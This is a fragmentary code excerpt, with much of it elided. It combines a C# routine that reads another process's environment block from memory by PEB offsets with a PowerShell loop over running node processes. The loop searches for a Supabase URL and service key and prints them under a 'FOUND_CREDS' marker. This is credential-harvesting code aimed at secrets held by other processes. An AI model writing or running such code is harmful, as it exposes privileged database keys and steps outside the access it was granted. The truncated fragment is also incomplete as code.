...
public class ProcessEnv {
    ...
    public static Dictionary<string, string> GetEnvironmentVariables(int processId) {
        ...
        try {
            ...
            // Get ProcessParameters pointer (offset 0x20 on 64-bit)
            IntPtr processParametersPtr = new IntPtr(BitConverter.ToInt64(peb, 0x20));

            // Read ProcessParameters (Environment pointer is at offset 0x80 on 64-bit)
...
foreach ($p in $nodeProcesses) {
    try {
        ...
        if ($env.Count -gt 0) {
            ...
            if (![string]::IsNullOrEmpty($supabaseUrl) -and ![string]::IsNullOrEmpty($supabaseServiceKey)) {
                Write-Output "FOUND_CREDS"
                Write-Output "URL:$supabaseUrl"
                Write-Output "KEY:$supabaseServiceKey"
                break
            }
        }
    } catch {
